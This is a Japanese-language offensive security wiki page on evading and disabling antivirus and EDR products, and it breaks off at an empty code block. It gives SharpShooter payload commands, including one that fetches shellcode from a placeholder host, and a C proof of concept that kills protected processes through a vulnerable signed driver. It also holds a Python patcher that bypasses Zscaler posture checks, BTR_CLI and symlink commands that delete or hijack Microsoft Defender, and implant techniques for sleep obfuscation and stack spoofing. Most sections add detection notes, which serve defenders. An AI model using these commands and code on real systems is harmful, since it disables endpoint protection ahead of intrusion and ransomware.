# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

Storm-2603 は、ランサムウェアを投下する前にエンドポイント保護を無効化するため、**Antivirus Terminator** として知られる小型のコンソールユーティリティを利用しました。このツールは**独自の脆弱だが *署名済み* の driver** を持ち込み、それを悪用して、Protected-Process-Light（PPL）で保護された AV サービスでも阻止できない特権的な kernel 操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **署名済み driver**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、実体は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に署名された driver `AToolsKrnl64.sys` です。この driver は有効な Microsoft 署名を持つため、Driver-Signature-Enforcement（DSE）が有効でもロードされます。
2. **サービスのインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   最初の行はドライバーを**kernel service**として登録し、2行目はドライバーを起動します。これにより、`\\.\ServiceMouse` が user land からアクセス可能になります。
3. **ドライバーが公開する IOCTL**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PIDを指定して任意のプロセスを終了する（Defender/EDRサービスの停止に使用） |
   | `0x990000D0` | ディスク上の任意のファイルを削除する |
   | `0x990001D0` | ドライバーをアンロードし、サービスを削除する |

   最小限のC proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **動作する理由**: BYOVD は user-mode の保護を完全に迂回します。kernel で実行されるコードは、PPL/PP、ELAM、その他の hardening 機能に関係なく、*protected* process を開いたり、終了させたり、kernel object を改ざんしたりできます。

検知 / 緩和策
•  Microsoft の脆弱な driver の block list（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を読み込まないようにします。
•  新しい *kernel* service の作成を監視し、world-writable directory から driver が読み込まれた場合や、allow-list にない driver が読み込まれた場合に警告します。
•  user-mode handle がカスタム device object に対して作成された後、不審な `DeviceIoControl` call が行われていないか監視します。

### ディスク上のバイナリを patch して Zscaler Client Connector の Posture Check を迂回する

Zscaler の **Client Connector** は、device-posture rule をローカルで適用し、結果を他の component に伝えるために Windows RPC に依存しています。次の 2 つの設計上の弱点により、完全な bypass が可能です。

1. Posture の評価は**完全に client-side**で行われます（boolean が server に送信されます）。
2. 内部 RPC endpoint は、接続する executable が Zscaler によって **signed** されていることだけを検証します（`WinVerifyTrust` を使用）。<sup>[[11]](#references)</sup>

**ディスク上の 4 つの signed binary を patch** することで、両方の仕組みを無効化できます。

| Binary | patch する元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべての check が compliant になります |
| `ZSAService.exe` | `WinVerifyTrust` への間接 call | NOP 化 ⇒ どの process（unsigned も含む）でも RPC pipe に接続できます |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換えられます |
| `ZSATunnel.exe` | tunnel の integrity check | 短絡されます |

patcher の最小限の抜粋:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

元のファイルを置き換えてサービススタックを再起動すると:

* 姿勢チェックは**すべて**緑色／準拠と表示されます。
* 署名されていない、または改変されたバイナリから、名前付きパイプの RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開けます。
* 侵害されたホストは、Zscaler ポリシーで定義された内部ネットワークに無制限でアクセスできるようになります。

このケーススタディでは、クライアント側だけで行われる信頼判定と単純な署名チェックが、わずかなバイトパッチで回避できることを示します。

## Microsoft Defender `BTR.sys` の信頼済み機能の悪用

Defender の **Boot-Time Removal** ドライバーは、従来の BYOVD とは異なる有用な例です。`BTR.sys` はメモリ破損のバグも IOCTL インターフェースも持たない、Microsoft 署名済みの正規の修復コンポーネントです。管理者アクセス権と `SeLoadDriverPrivilege` を取得した後、攻撃者は代わりに非公開の修復トランザクションを偽造し、本来の Ring-0 ファイル／レジストリ操作を実行できます。これは**侵害後の AV/EDR 無効化プリミティブであり、初期アクセスや権限昇格ではありません**。また、目立つサードパーティ製ドライバーを持ち込む代わりに、標的自身の `MpEngine.dll` 内にある `BOOTTIMETOOL` リソースからドライバーを抽出できます。<sup>[[36]](#references)</sup>

### ワンショットドライバーの準備

Defender は通常、このリソースをランダムな `[a-z]{8}.sys` ファイルとして展開し、同様の名前を持つカーネルサービスを登録します。`DriverEntry` はサービスの `Args` 値を読み取り、指定された NTFS ADS を開いて、アクションリストを復号・検証し、フィードバックを書き込みます。実行が成功すると `0xC0000056` (`STATUS_DELETE_PENDING`) を返すため、ドライバーは常駐せずアンロードされます。偽造したサービスには、次のような特徴的な値が設定されます。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` ストリームには、RC4で暗号化されたblobが1つ含まれます。解析対象のビルドでは固定の256バイトキーが再利用されているため、暗号化は認可の境界にはなりません。有効な平文は24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロードから導出されたトランザクションID）で始まり、その後にヌル終端UTF-16のフィードバックパスと任意の数のアイテムが続きます。各アイテムは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータで構成され、末尾は**必ず4バイトのNUL**です。各ヘッダー／データ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**最終XORなし**（`~CRC32`）で個別に検証されます。CRC状態は領域ごとにリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられるアクションIDによって、以下のkernelプリミティブを利用できます。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | アイテムデータ | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | ロックされたファイルを含め、ファイルを削除する |
| 2 | `[UTF-16 path]` | 空のディレクトリを削除する |
| 3 | `[Flags][source][destination]` | ファイルを攻撃者が選択した保護対象パスに移動する。宛先が空の場合は削除する |
| 4 | `[Flags][key path]` | レジストリキーを再帰的に削除する |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値を削除する |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値を作成／更新し、不足しているキーのパスを作成する |

アクション5と6では、ワイヤ上のキー／値の区切り文字は**連続する2つのバックスラッシュ**です。一般的な形式のパスでは正しく分割されません。フィードバックファイルは概ねリクエストを反映しますが、各アイテムの先頭4バイトのデータは結果の`NTSTATUS`になります。先頭にフラグフィールドがないアクション1と2では、ステータス用の領域を確保するため、BTRはパスを末尾の予約済み4バイトに移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI`のワークフローと早期起動時のウィンドウ

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は一連の処理をすべて実装しています。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とフィードバックストリームを作成し、連結したアクションをシリアライズ／チェックサム計算／暗号化した後、サービスのレジストリキーを直接作成します。その後、`-trigger now`では`NtLoadDriver`を呼び出し、`-trigger boot`ではシステム起動時に読み込まれるドライバーとして残します。レジストリを直接ステージングするため、通常のSCM `CreateServiceW`経路を通らず、サービスインストールのイベントID 7045は記録されません。起動トリガーで作成された痕跡は、後で`BTR_CLI.exe -cleanup <service_name>`を使って削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` は使用できません。BTR はストレージスタックと `SystemRoot` リンクの準備が整う前に、`DriverEntry` からファイル I/O を実行するためです。高優先度の `Boot Bus Extender` グループと `Start=1` を組み合わせると、Phase 1 で実行されます。この時点では NTFS は使用できますが、多くのシステム起動セキュリティドライバーやユーザーモード EDR サービスはまだ初期化されていません。`WdFilter` などのブート開始フィルターはすでにロードされている可能性がありますが、BTR は次回の起動前にそのバイナリやサービス構成を削除でき、SCM がサービス実行ファイルを起動する前に削除することもできます。BTR はブート開始の評価後に実行され、有効な Microsoft 署名を持つため、ELAM でもこの隙間は塞げません。<sup>[[36]](#references)</sup>

複数のアクションが1つのトランザクション内で実行されます。PoC は、ハードコードされた `\SystemRoot\Temp\BootClean.log` に対する Action 1 を先頭に追加します。BTR はこのログを作成した後、自身の削除要求を処理し、アンロード前にログを削除します。これにより痕跡を減らせます。また、フィードバックを `<random>.sys:<random>.dat` に置くと、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 検知価値の高い相関

署名だけに基づくルールや Microsoft の脆弱なドライバーのブロックリストでは、意図された BTR 機能の悪用に対処できません。正規の Defender 系統と任意のランチャーを区別しつつ、次のような振る舞いの相関を優先してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` の作成は、BTR のステージングで常に発生します。同じ `.sys` に付加された `.dat` ADS は特に疑わしい動作です。正規の Defender は通常、フィードバックを `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 以下に配置するためです。
- **System 7045 を伴わない Sysmon 12/13:** `Args=...:changelist` と `Group=Boot Bus Extender` を含む `HKLM\SYSTEM\CurrentControlSet\Services\<random>` の直接作成を、対応する SCM インストールイベントがないことと相関付けます。
- **Sysmon 6 -> 23:** Defender 以外の系統から既知の BTR ドライバーがロードされた後、`System`/PID 4 によってファイルが削除されたことを相関付けます。特にセキュリティ関連のバイナリが対象の場合は要注意です。
- **Sysmon 11 -> 23:** `System`/PID 4 による `\SystemRoot\Temp\BootClean.log` の短時間での作成と削除を検知します。
- `SeLoadDriverPrivilege` の割り当てと有効化を制限し、監査します。`cmd.exe`、PowerShell、または不明なプロセスがセキュリティツールのドライバーをステージングする場合、Microsoft 署名だけでは信頼の根拠として不十分です。

## LOLBINs を利用して Protected Process Light (PPL) を悪用し、AV/EDR を改ざんする

Protected Process Light (PPL) は署名者/レベルの階層を適用し、同等以上に保護されたプロセスだけが相互に改ざんできるようにします。攻撃側の視点では、PPL 対応バイナリを正規の方法で起動し、その引数を制御できる場合、ログ記録などの無害な機能を利用して、AV/EDR が使用する保護ディレクトリに対する、制約付きの PPL ベースの書き込みプリミティブに変えられます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

PPL としてプロセスを実行する条件
- 対象の EXE（およびロードされる DLL）は、PPL 対応 EKU で署名されている必要があります。
- `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` フラグを指定して、CreateProcess でプロセスを作成する必要があります。
- バイナリの署名者に一致する、互換性のある保護レベルを要求する必要があります（例: マルウェア対策署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者には `PROTECTION_LEVEL_WINDOWS`）。誤ったレベルを指定すると、作成に失敗します。

PP/PPL と LSASS の保護に関するより広範な概要については、こちらも参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数を対象 EXE に渡します）:
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用例:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身を起動し、呼び出し元が指定したパスにログファイルを書き込むパラメーターを受け取ります。
- PPL process として起動すると、PPL の権限でファイルが書き込まれます。
- ClipUp はスペースを含むパスを解析できません。通常は保護されている場所を指定するには、8.3 short path を使用します。

8.3 short path helpers
- 短縮名を一覧表示するには、各親ディレクトリで `dir /x` を実行します。
- cmd で short path を導出するには、`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA` を実行します。

悪用チェーン（概要）
1) ランチャー（例: CreateProcessAsPPL）を使い、`CREATE_PROTECTED_PROCESS` を指定して PPL 対応 LOLBIN（ClipUp）を起動します。
2) ClipUp のログパス引数を渡し、保護された AV ディレクトリ（例: Defender Platform）にファイルを作成させます。必要に応じて 8.3 short name を使用します。
3) 対象バイナリが実行中に通常 AV によって開かれ、ロックされている場合（例: MsMpEng.exe）、AV の起動前に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールして、起動時に書き込みをスケジュールします。Process Monitor のブートログで起動順序を検証します。
4) 再起動すると、AV がバイナリをロックする前に PPL の権限で書き込みが行われ、対象ファイルが破損して起動できなくなります。

実行例（安全のためパスを省略・短縮）:

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

注意事項と制約
- ClipUp が書き込む内容は配置以外制御できません。このプリミティブは、正確な内容の注入ではなく破損に適しています。
- サービスのインストール／起動と、再起動できる時間帯が必要です。ローカル管理者権限または SYSTEM 権限が必要です。
- タイミングが重要です。対象が開かれていてはいけません。起動時に実行すれば、ファイルロックを回避できます。

検出
- 起動前後に、特に標準外のランチャーを親プロセスとする、通常とは異なる引数での `ClipUp.exe` のプロセス作成。
- 不審なバイナリを自動起動するよう構成された新しいサービスや、Defender/AV より常に先に起動するサービス。Defender の起動失敗の前に、サービスが作成／変更されていないか調査します。
- Defender のバイナリ／Platform ディレクトリに対するファイル整合性監視。保護プロセスフラグを持つプロセスによる予期しないファイルの作成／変更を確認します。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を調べます。

緩和策
- WDAC/Code Integrity：どの署名済みバイナリが、どの親プロセスのもとで PPL として実行できるかを制限します。正規のコンテキスト以外での ClipUp の実行をブロックします。
- サービスの管理：自動起動サービスの作成／変更を制限し、起動順序の操作を監視します。
- Defender の改ざん防止と早期起動保護が有効になっていることを確認します。バイナリの破損を示す起動エラーを調査します。
- 環境との互換性がある場合は、セキュリティツールを配置したボリュームでの 8.3 短縮名生成の無効化を検討します（十分にテストしてください）。

## Platform バージョンフォルダーのシンボリックリンク乗っ取りによる Microsoft Defender の改ざん

Windows Defender は、次の場所にあるサブフォルダーを列挙して、実行元となる Platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も大きい辞書順のバージョン文字列（例：`4.18.25070.5-0`）を持つサブフォルダーを選択し、そこから Defender サービスのプロセスを起動します（それに応じてサービス／レジストリのパスも更新します）。この選択では、ディレクトリの再解析ポイント（シンボリックリンクを含む）も信頼されます。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスへリダイレクトし、DLL sideloading またはサービス妨害を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル管理者権限（Platform フォルダー内にディレクトリ／シンボリックリンクを作成するために必要）
- 再起動、または Defender による Platform の再選択を引き起こす手段（起動時のサービス再起動）
- 必要なツールは組み込みのもののみ（mklink）

有効な理由
- Defender は自身のフォルダーへの書き込みをブロックしますが、Platform の選択時にはディレクトリエントリを信頼し、リンク先が保護された／信頼されたパスに解決されるか検証せずに、辞書順で最も大きいバージョンを選択します。

手順（例）
1) 現在の Platform フォルダーの書き込み可能なコピー（例：`C:\TMP\AV`）を用意します。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダーを指す、より高いバージョン番号のディレクトリ symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認します:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスのパスが `C:\TMP\AV\` 配下にあり、サービス設定／レジストリにもその場所が反映されていることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置／置換して、Defender のプロセス内でコードを実行します。上記のセクション「[DLL Sideloading & Proxying](#dll-sideloading--proxying)」を参照してください。
- Service kill/denial: バージョンのシンボリックリンクを削除し、次回起動時に設定されたパスが解決されず、Defender が起動に失敗するようにします：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この technique 単体では privilege escalation はできず、admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team は、Import Address Table (IAT) を hook し、選択した API を attacker が制御する position-independent code (PIC) 経由で呼び出すことで、runtime evasion を C2 implant から対象 module 自体へ移せます。これにより、多くの kit が公開する限られた API（例: CreateProcessA）にとどまらず、evasion を広く適用でき、同じ保護を BOF や post-exploitation DLL にも拡張できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

概要
- reflective loader を使い、target module とともに PIC blob を配置します（前置または companion）。PIC は自己完結型で、position-independent である必要があります。
- host DLL のロード時に IMAGE_IMPORT_DESCRIPTOR をたどり、対象 import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT entry を、薄い PIC wrapper を指すように patch します。
- 各 PIC wrapper は、実 API address に tail-call する前に evasion を実行します。一般的な evasion は次のとおりです。
  - call の前後で memory を mask/unmask する（例: beacon region を暗号化する、RWX→RX に変更する、page 名や permission を変更し、call 後に元に戻す）。
  - Call-stack spoofing: 無害な stack を構築し、target API に遷移して、call-stack analysis で想定される frame に解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性のため、Aggressor script（または同等のもの）が Beacon、BOF、post-ex DLL 用に hook する API を登録できる interface を export します。

ここで IAT hooking を使う理由
- hook した import を使うあらゆる code に適用でき、tool code の変更や、特定の API を proxy する Beacon への依存が不要です。
- post-ex DLL をカバーします。LoadLibrary* を hook すれば、module のロード（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API call に同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrap することで、call-stack ベースの detection に対して、process を spawn する post-ex command を安定して利用できます。

最小限の IAT hook の例（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
メモ
- relocations/ASLR の適用後、import の初回使用前にパッチを適用します。TitanLdr/AceLdr のような Reflective loader は、ロードされたモジュールの DllMain 中にフックする例です。
- wrapper は小さく保ち、PIC-safe にします。パッチ適用前に取得しておいた元の IAT 値、または LdrGetProcedureAddress を使って本来の API を解決します。
- PIC には RW → RX の遷移を使用し、書き込み可能かつ実行可能なページを残さないようにします。

Call-stack spoofing stub
- Draugr 形式の PIC stub は、偽の call chain（無害なモジュール内の return address）を構築し、その後、本来の API に移ります。
- これにより、Beacon/BOFs から機密性の高い API への標準的な stack を想定する検知を回避できます。
- stack cutting/stack stitching 技術と組み合わせ、API prologue の前に想定される frame 内へ移動します。

運用上の統合
- Reflective loader を post-ex DLL の先頭に追加し、DLL のロード時に PIC とフックを自動的に初期化します。
- Aggressor script で対象 API を登録すると、コードを変更せずに Beacon と BOFs が同じ evasion path の恩恵を受けられます。

検知/DFIR 上の考慮事項
- IAT integrity: 非 image（heap/anon）アドレスに解決されるエントリ、import pointer の定期的な検証。
- Stack anomalies: ロード済み image に属さない return address、非 image PIC への突然の遷移、一貫性のない RtlUserThreadStart の祖先関係。
- Loader telemetry: プロセス内での IAT への書き込み、import thunk を変更する DllMain の早期実行、ロード時に作成される予期しない RX region。
- Image-load evasion: LoadLibrary* をフックする場合は、memory masking event と相関する automation/clr assembly の不審なロードを監視します。

関連する building block と例
- ロード中に IAT patching を行う Reflective loader（例: TitanLdr、AceLdr）
- Memory masking hook（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### resident PICO による import-time IAT hook

Reflective loader を制御できる場合、カスタム resolver で loader の `GetProcAddress` pointer を置き換えることで、`ProcessImports()` の**実行中**に import をフックできます:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PIC が自身を解放した後も残る **resident PICO**（永続的な PIC object）を構築します。
- loader の import resolver を上書きする `setup_hooks()` function を export します（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal import をスキップし、`__resolve_hook(ror13hash(name))` のような hash ベースの hook lookup を使います。hook があればそれを返し、なければ本来の `GetProcAddress` に委譲します。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entry で、link 時に hook target を登録します。hook は resident PICO 内にあるため有効なままです。

これにより、ロード後に DLL の code section を patch することなく、**import-time IAT redirection** を実現できます。

### 対象が PEB-walking を使う場合に hook 可能な import を強制する

import-time hook が発動するのは、対象の IAT に該当 function が実際に存在する場合のみです。モジュールが PEB-walk + hash で API を解決し（import entry がない場合）、実際の import を強制して loader の `ProcessImports()` path に認識させます。

- hash による export 解決（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような直接参照に置き換えます。
- これにより compiler が IAT entry を生成し、Reflective loader が import を解決する際に interception が可能になります。

### `Sleep()` を patch しない Ekko 形式の sleep/idle obfuscation

`Sleep` を patch する代わりに、implant が実際に使用する **wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook します。長時間の wait では、Ekko 形式の obfuscation chain で call をラップし、idle 中にメモリ内 image を暗号化します:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使って、細工した `CONTEXT` frame を指定し `NtContinue` を呼び出す一連の callback をスケジュールします。
- 典型的な chain（x64）: image を `PAGE_READWRITE` に設定 → `advapi32!SystemFunction032` でマップ済み image 全体を RC4 暗号化 → blocking wait を実行 → RC4 復号 → PE section を走査して **section ごとの権限を復元** → 完了を通知。
- `RtlCaptureContext` で template となる `CONTEXT` を取得し、複数の frame に複製して、各 step を呼び出すために register（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細: image が mask されている間に caller が処理を続けられるよう、長時間の wait には `WAIT_OBJECT_0` などの「success」を返します。この手法は idle window 中に scanner からモジュールを隠し、従来型の「patched `Sleep()`」signature を避けます。

検知のアイデア（telemetry ベース）
- `NtContinue` を指す `CreateTimerQueueTimer` callback が短時間に集中して発生する。
- `advapi32!SystemFunction032` が、image と同程度のサイズを持つ大きな連続 buffer に対して使われる。
- 広範囲の `VirtualProtect` の後に、custom な section ごとの権限復元が行われる。

### sleep-obfuscation gadget の runtime CFG registration

CFG が有効な target では、`jmp [rbx]` や `jmp rdi` のような function 中間部の gadget への最初の indirect jump は、通常、gadget がモジュールの CFG metadata に存在しないため `STATUS_STACK_BUFFER_OVERRUN` で process をクラッシュさせます。hardening された process 内で Ekko/Kraken 形式の chain を動作させるには:<sup>[[30]](#references)</sup>

- chain が使う indirect destination をすべて、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で登録します。
- ロード済み image（`ntdll`、`kernel32`、`advapi32`）内の address では、`MEMORY_RANGE_ENTRY` の開始位置を **image base** とし、**image 全体のサイズ**を範囲に含める必要があります。
- 手動で map した/PIC/stomp した region では、代わりに **allocation base** と allocation size を使います。
- dispatch gadget だけでなく、間接的に呼び出される export（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、間接 target となる attacker-controlled な実行可能 section も登録します。

これにより、ROP/JOP 形式の sleep chain を「CFG が無効な process でのみ動作する」ものから、`explorer.exe`、browser、`svchost.exe`、および `/guard:cf` でコンパイルされた他の endpoint でも再利用できる primitive に変えられます。

### sleeping thread の CET-safe stack spoofing

`CONTEXT` を全面的に置き換える方法は目立ちやすく、CET Shadow Stack system では spoof した `Rip` が hardware shadow stack と一致する必要があるため、問題を起こすことがあります。より安全な sleep-masking pattern は次のとおりです:<sup>[[30]](#references)</sup>

- 同じ process 内の別 thread を選び、`NtQueryInformationThread` を使って `NT_TIB` / TEB の stack bound（`StackBase`、`StackLimit`）を読み取ります。
- 現在の thread の本来の TEB/TIB をバックアップします。
- `GetThreadContext` で実際に sleep している context を取得します。
- spoof context の `Rsp`/stack state はそのままにして、本来の `Rip` **だけ**をコピーします。
- sleep window 中は spoof thread の `NT_TIB` を現在の TEB にコピーし、stack walker が正当な stack range 内で unwind するようにします。
- wait 完了後、元の TIB と thread context を復元します。

これにより CET と整合する instruction pointer を維持しながら、TEB stack metadata を信頼して unwind を検証する EDR stack walker を欺けます。

### APC による代替手段: Kraken Mask

timer-queue dispatch の signature が強すぎる場合は、suspend した helper thread から queued APC を使って、同じ sleep-encrypt-spoof-restore sequence を実行できます:<sup>[[27]](#references)</sup>

- `NtTestAlert` を entrypoint とする helper thread を作成します。
- `NtQueueApcThread` で準備した `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で処理します。
- default の 64 KB thread stack を使い切らないよう、chain state は helper stack ではなく heap に保存します。
- `NtSignalAndWaitForSingleObject` で start event の通知と block を原子的に行います。
- 半端に復元された stack を scanner に検出される race window を減らすため、TIB/context を復元する前に main thread を suspend します（`NtSuspendThread` → restore → `NtResumeThread`）。

この方法では、RC4 masking と stack-spoofing の目標を維持しつつ、`CreateTimerQueueTimer` + `NtContinue` signature を helper-thread/APC signature に置き換えます。

追加の検知アイデア
- sleep、wait、APC dispatch の直前に行われる `NtSetInformationVirtualMemory` と `VmCfgCallTargetInformation` の組み合わせ。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、または `ConnectNamedPipe` の前後で使われる `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` の後に、現在の thread の TEB/TIB stack bound へ直接書き込む処理。
- 間接的に `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- 署名済みモジュール内で dispatch pivot として短い gadget signature（`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`））を繰り返し使う処理。


## Precision Module Stomping

Module stomping は、明らかな private executable memory を割り当てたり、新しい sacrificial DLL をロードしたりする代わりに、**target process 内にすでに map されている DLL の `.text` section** から payload を実行します。上書き先には、process がまだ必要とする code path を壊さずに payload を格納できる、**ロード済みで disk-backed の image** を選ぶ必要があります。<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` や `comctl32.dll` など一般的なモジュールを使った安易な stomping は脆弱です。DLL が remote process にロードされていない場合があり、code region が小さすぎると process がクラッシュします。より確実な workflow は次のとおりです。

1. target process の module を列挙し、すでにロード済みの DLL の **names-only include list** を作成します。
2. 先に payload を build し、**正確な byte size** を記録します。
3. disk 上の候補 DLL を調べ、PE section の **`.text` `Misc_VirtualSize`** と payload size を比較します。これは file size より重要です。メモリに map された**実行可能 section のサイズ**を反映するためです。
4. **Export Address Table (EAT)** を解析し、stomp の開始 offset として export された function の RVA を選択します。
5. **blast radius** を計算します。payload が選択した function の境界を越えると、メモリ上で後続に配置された隣接 export を上書きします。

実際に使われている代表的な recon/selection helper:

```cmd
